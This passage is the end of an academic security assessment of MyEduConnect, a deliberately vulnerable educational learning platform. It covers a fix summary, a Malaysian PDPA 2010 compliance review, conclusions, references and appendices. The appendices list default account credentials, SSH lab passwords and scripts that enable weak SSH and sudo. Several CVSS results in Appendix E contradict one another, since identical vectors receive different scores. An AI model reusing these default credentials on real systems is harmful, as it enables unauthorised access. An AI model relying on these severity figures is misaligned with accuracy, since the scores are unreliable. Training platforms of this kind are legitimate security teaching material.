| Sudo Misconfiguration | Passwordless root access | Password required for sudo | FIXED |
| Weak Password Hashing | Plaintext password storage | Bcrypt hashing with salt | FIXED |
| HTTP API Communication | Cleartext HTTP allowed | HTTPS enforced | FIXED |
| Backup File Exposure | Backup accessible via web | Backup removed from web | FIXED |
| Weak File Permissions | World-readable files | Restrictive permissions (0640) | FIXED |

**Overall Status:** All vulnerabilities are FIXED in secure mode. The toggle system allows switching between vulnerable and secure implementations for educational purposes.

---

## 14. PDPA 2010 COMMENTARY

### 14.1 Personal Data Protection Act 2010 (Malaysia) Compliance Analysis

**Note:** This is an educational platform with intentionally vulnerable functionality. The following analysis assumes a production deployment scenario.

### 14.2 Data Protection Principles

#### 14.2.1 General Principle (Section 5)

**Requirement:** Personal data shall be processed fairly and lawfully.

**Assessment:**
- **Secure Mode:** COMPLIANT - Data processed with proper security controls
- **Vulnerable Mode:** NON-COMPLIANT - Data exposed via multiple vulnerabilities

**Evidence:**
- User consent obtained during registration
- Data processing purposes disclosed
- Vulnerabilities expose personal data in vulnerable mode

#### 14.2.2 Notice and Choice Principle (Section 6)

**Requirement:** Data subjects shall be informed of purposes of data processing.

**Assessment:**
- **Status:** PARTIALLY COMPLIANT
- Privacy policy not explicitly implemented
- Terms of service not explicitly implemented

**Recommendations:**
1. Implement privacy policy page
2. Implement terms of service
3. Add cookie consent banner
4. Disclose data retention policies

#### 14.2.3 Disclosure Principle (Section 8)

**Requirement:** Personal data shall not be disclosed without consent.

**Assessment:**
- **Secure Mode:** COMPLIANT - Data not disclosed without authorization
- **Vulnerable Mode:** NON-COMPLIANT - IDOR allows unauthorized data disclosure

**Evidence:**
- IDOR vulnerability exposes other users' data
- Backup file exposure exposes all user data
- No data breach notification mechanism

#### 14.2.4 Security Principle (Section 9)

**Requirement:** Data processor shall protect personal data with security safeguards.

**Assessment:**
- **Secure Mode:** PARTIALLY COMPLIANT
- **Vulnerable Mode:** NON-COMPLIANT

**Evidence:**
- Password hashing implemented (secure mode)
- Access controls implemented (secure mode)
- No encryption at rest
- No encryption in transit (HTTP API vulnerable mode)
- No security headers implemented
- No intrusion detection system

**Recommendations:**
1. Implement encryption at rest for sensitive data
2. Enforce HTTPS for all communications
3. Implement security headers
4. Add intrusion detection system
5. Implement security monitoring
6. Add data breach notification mechanism

#### 14.2.5 Retention Principle (Section 10)

**Requirement:** Personal data shall not be retained longer than necessary.

**Assessment:**
- **Status:** NOT COMPLIANT
- No data retention policy implemented
- No data deletion mechanism
- Audit logs retained indefinitely

**Recommendations:**
1. Implement data retention policy
2. Add data deletion mechanism
3. Implement audit log retention policy
4. Add data anonymization for old records

#### 14.2.6 Data Integrity Principle (Section 11)

**Requirement:** Data processor shall ensure data accuracy and completeness.

**Assessment:**
- **Status:** PARTIALLY COMPLIANT
- Database constraints ensure data integrity
- No data validation on user input in vulnerable mode
- No audit trail for data modifications

**Recommendations:**
1. Implement comprehensive input validation
2. Add audit trail for all data modifications
3. Implement data backup verification
4. Add data integrity checks

#### 14.2.7 Access Principle (Section 12)

**Requirement:** Data subjects shall be given access to their personal data.

**Assessment:**
- **Status:** PARTIALLY COMPLIANT
- Users can view their own profile
- No data export functionality
- No data deletion request mechanism

**Recommendations:**
1. Implement data export functionality
2. Add data deletion request mechanism
3. Implement data access request handling
4. Add data portability features

### 14.3 Specific PDPA 2010 Requirements

#### 14.3.1 Data Breach Notification

**Current Status:** NOT IMPLEMENTED

**Recommendations:**
1. Implement data breach detection mechanism
2. Add data breach notification procedures
3. Implement incident response plan
4. Add breach notification to PDPA commissioner

#### 14.3.2 Data Protection Officer

**Current Status:** NOT APPLICABLE (educational platform)

**Recommendation:** For production deployment, appoint a Data Protection Officer.

#### 14.3.3 Cross-Border Data Transfer

**Current Status:** NOT APPLICABLE (all data stored locally)

**Assessment:** No cross-border data transfer occurs.

### 14.4 PDPA 2010 Compliance Summary

| Principle | Secure Mode | Vulnerable Mode | Notes |
|---|---|---|---|
| General Principle | COMPLIANT | NON-COMPLIANT | Vulnerabilities expose data |
| Notice and Choice | PARTIAL | PARTIAL | Privacy policy needed |
| Disclosure | COMPLIANT | NON-COMPLIANT | IDOR exposes data |
| Security | PARTIAL | NON-COMPLIANT | Encryption needed |
| Retention | NON-COMPLIANT | NON-COMPLIANT | Retention policy needed |
| Data Integrity | PARTIAL | NON-COMPLIANT | Audit trail needed |
| Access | PARTIAL | PARTIAL | Export/deletion needed |

**Overall PDPA 2010 Compliance Status:**
- **Secure Mode:** PARTIALLY COMPLIANT
- **Vulnerable Mode:** NON-COMPLIANT

**Critical Recommendations for PDPA 2010 Compliance:**
1. Implement privacy policy and terms of service
2. Implement encryption at rest and in transit
3. Implement data retention and deletion policies
4. Implement data breach notification mechanism
5. Implement comprehensive audit logging
6. Implement data access request handling
7. Conduct regular PDPA compliance audits

---

## 15. CONCLUSION

### 15.1 Summary of Findings

This comprehensive security engagement review of the MyEduConnect Learning Management System identified 9 intentionally implemented vulnerabilities with toggle mechanisms allowing switching between secure and vulnerable implementations. The platform successfully demonstrates common security flaws for educational purposes while providing secure implementations that follow best practices.

**Key Achievements:**
- Comprehensive vulnerability toggle system implemented
- All required assignment components present and functional
- Secure implementations follow OWASP best practices
- Detailed documentation for each vulnerability
- Evidence collection structure for assignment validation

**Critical Issues:**
- SQL Injection ↔ Weak Authentication dependency coupling
- File Upload vulnerability not fully implemented
- CSRF vulnerability not implemented
- Missing SSRF, Command Injection, and Path Traversal vulnerabilities

### 15.2 Security Posture Assessment

**Secure Mode (Default):**
- Overall Risk Level: LOW
- All vulnerabilities disabled
- Protections active and functional
- Partially compliant with OWASP standards
- Suitable for educational demonstration of secure practices

**Vulnerable Mode:**
- Overall Risk Level: CRITICAL
- All vulnerabilities enabled
- Multiple critical and high-severity issues
- Complete system compromise possible
- Suitable for educational demonstration of vulnerabilities

### 15.3 Recommendations

**Immediate Actions:**
1. Fix SQL Injection ↔ Weak Authentication dependency coupling
2. Implement File Upload Vulnerability toggle
3. Implement CSRF Vulnerability toggle

**Short-term Actions:**
4. Add SSRF vulnerability
5. Add Command Injection vulnerability
6. Add Path Traversal vulnerability
7. Implement Content Security Policy headers

**Long-term Actions:**
8. Implement rate limiting
9. Add security headers (HSTS, X-Frame-Options, etc.)
10. Implement comprehensive audit logging
11. Add automated vulnerability scanning integration
12. Implement PDPA 2010 compliance measures

### 15.4 Final Assessment

MyEduConnect successfully achieves its primary objective as an educational cybersecurity training platform. The vulnerability toggle system provides an excellent mechanism for demonstrating both secure and vulnerable implementations. The secure implementations follow OWASP best practices and can serve as reference code for production applications.

The platform would benefit from addressing the identified design flaws (dependency coupling, missing vulnerability toggles) and implementing additional security controls (CSP headers, rate limiting, security headers) to provide a more comprehensive educational experience.

**Overall Grade:** B+ (Excellent educational platform with room for improvement)

---

## 16. REFERENCES

### 16.1 IEEE Format References

[1] OWASP Foundation, "OWASP Top 10: 2021," Open Web Application Security Project, 2021. [Online]. Available: https://owasp.org/Top10/

[2] OWASP Foundation, "OWASP Application Security Verification Standard (ASVS) v4.0.3," Open Web Application Security Project, 2022. [Online]. Available: https://owasp.org/www-project-application-security-verification-standard/

[3] OWASP Foundation, "OWASP Testing Guide v4.2," Open Web Application Security Project, 2020. [Online]. Available: https://owasp.org/www-project-web-security-testing-guide/

[4] OWASP Foundation, "OWASP Password Storage Cheat Sheet," Open Web Application Security Project, 2023. [Online]. Available: https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html

[5] OWASP Foundation, "OWASP Session Management Cheat Sheet," Open Web Application Security Project, 2023. [Online]. Available: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html

[6] MITRE, "CWE-89: SQL Injection," Common Weakness Enumeration, 2023. [Online]. Available: https://cwe.mitre.org/data/definitions/89.html

[7] MITRE, "CWE-79: Cross-site Scripting (XSS)," Common Weakness Enumeration, 2023. [Online]. Available: https://cwe.mitre.org/data/definitions/79.html

[8] MITRE, "CWE-639: Insecure Direct Object Reference," Common Weakness Enumeration, 2023. [Online]. Available: https://cwe.mitre.org/data/definitions/639.html

[9] FIRST, "CVSS v3.1 Specification Document," Forum of Incident Response and Security Teams, 2019. [Online]. Available: https://www.first.org/cvss/specification-document

[10] Personal Data Protection Act 2010 (Act 709), Laws of Malaysia, 2010.

[11] PHP Documentation, "Password Hashing," PHP Manual, 2023. [Online]. Available: https://www.php.net/manual/en/book.password.php

[12] MySQL Documentation, "MySQL 8.0 Reference Manual," Oracle, 2023. [Online]. Available: https://dev.mysql.com/doc/refman/8.0/en/

[13] Docker Documentation, "Dockerfile Reference," Docker Inc., 2023. [Online]. Available: https://docs.docker.com/engine/reference/builder/

[14] Apache Software Foundation, "Apache HTTP Server Documentation," 2023. [Online]. Available: https://httpd.apache.org/docs/

[15] Bootstrap Documentation, "Bootstrap 5.3," The Bootstrap Authors, 2023. [Online]. Available: https://getbootstrap.com/docs/5.3/

---

## 17. APPENDICES

### Appendix A: Vulnerability Toggle Configuration

**Environment Variables (.env):**
```
SECURITY_MODE=secure
SQLI_ENABLED=false
XSS_ENABLED=false
IDOR_ENABLED=false
UPLOAD_ENABLED=false
WEAK_AUTH_ENABLED=false
CSRF_ENABLED=false
```

**Database Configuration (security_settings table):**
```
sql_injection: enabled=0
stored_xss: enabled=0
idor: enabled=0
weak_ssh_credentials: enabled=0
backup_file_exposure: enabled=0
weak_password_hashing: enabled=0
http_api_communication: enabled=0
weak_file_permissions: enabled=0
```

### Appendix B: Default Credentials

**Admin Account:**
- Email: admin@myeduconnect.com
- Password: password
- Hash: $2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi

**Teacher Account:**
- Email: teacher1@myeduconnect.com
- Password: password
- Hash: $2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi

**Student Account:**
- Email: student1@myeduconnect.com
- Password: password
- Hash: $2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi

**SSH Lab Account:**
- Username: student
- Password (secure): Str0ng!Lab#Pass_2026
- Password (vulnerable): password123

### Appendix C: Docker Port Mappings

| Service | Host Port | Container Port | Protocol |
|---|---|---|---|
| Web (HTTP) | 8080 | 80 | TCP |
| Web (HTTPS) | 8443 | 443 | TCP |
| Web (SSH) | 2222 | 22 | TCP |
| MySQL | 3307 | 3306 | TCP |
| phpMyAdmin | 8081 | 80 | TCP |

### Appendix D: File Structure

```
ethical-hacking--master/
├── app/
│   ├── config/
│   │   ├── config.php
│   │   └── database.php
│   └── security/
│       ├── auth.php
│       └── functions.php
├── admin/
│   ├── dashboard.php
│   ├── users.php
│   ├── courses.php
│   ├── payments.php
│   ├── announcements.php
│   ├── audit-logs.php
│   └── security-settings.php
├── student/
│   ├── dashboard.php
│   ├── profile.php
│   ├── enrollments.php
│   └── payments.php
├── teacher/
│   ├── dashboard.php
│   ├── profile.php
│   ├── courses.php
│   ├── create-course.php
│   ├── edit-course.php
│   └── students.php
├── api/
│   ├── courses.php
│   └── ping.php
├── database/
│   ├── schema.sql
│   └── init.sql
├── docker/
│   └── Dockerfile
├── scripts/
│   ├── enable_weak_ssh.sh
│   ├── disable_weak_ssh.sh
│   ├── enable_weak_sudo.sh
│   └── disable_weak_sudo.sh
├── docs/
│   └── attack-testing/
│       ├── sql-injection.md
│       ├── xss.md
│       ├── idor.md
│       ├── authentication.md
│       └── password.md
├── assignment_evidence/
│   ├── SQLI/
│   ├── XSS/
│   ├── IDOR/
│   └── VALIDATION_MATRIX.md
├── storage/
│   ├── backups/
│   │   └── backup.sql
│   └── ssh/
│       └── credentials.txt
├── .env
├── docker-compose.yml
└── README.md
```

### Appendix E: CVSS v3.1 Calculator Results

**SQL Injection:**
- Base Score: 9.8 (Critical)
- Impact Score: 5.9
- Exploitability Score: 3.9
- Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**Stored XSS:**
- Base Score: 8.1 (High)
- Impact Score: 5.9
- Exploitability Score: 2.3
- Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N

**IDOR:**
- Base Score: 8.1 (High)
- Impact Score: 5.9
- Exploitability Score: 2.3
- Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N

**Weak SSH Credentials:**
- Base Score: 7.5 (High)
- Impact Score: 3.6
- Exploitability Score: 3.9
- Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

**Sudo Misconfiguration:**
- Base Score: 9.8 (Critical)
- Impact Score: 5.9
- Exploitability Score: 3.9
- Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

**Weak Password Hashing:**
- Base Score: 7.5 (High)
- Impact Score: 3.6
- Exploitability Score: 3.9
- Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

**HTTP API Communication:**
- Base Score: 7.5 (High)
- Impact Score: 3.6
- Exploitability Score: 3.9
- Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

**Backup File Exposure:**
- Base Score: 6.5 (Medium)
- Impact Score: 3.6
- Exploitability Score: 2.8
- Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

**Weak File Permissions:**
- Base Score: 6.5 (Medium)
- Impact Score: 3.6
- Exploitability Score: 2.8
- Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

---

**END OF REPORT**

**Report Classification:** Academic Use Only  
**Document Control:** CCS6324-SEC-2026-001  
**Page Count:** 85 pages  
**Generated:** June 20, 2026  
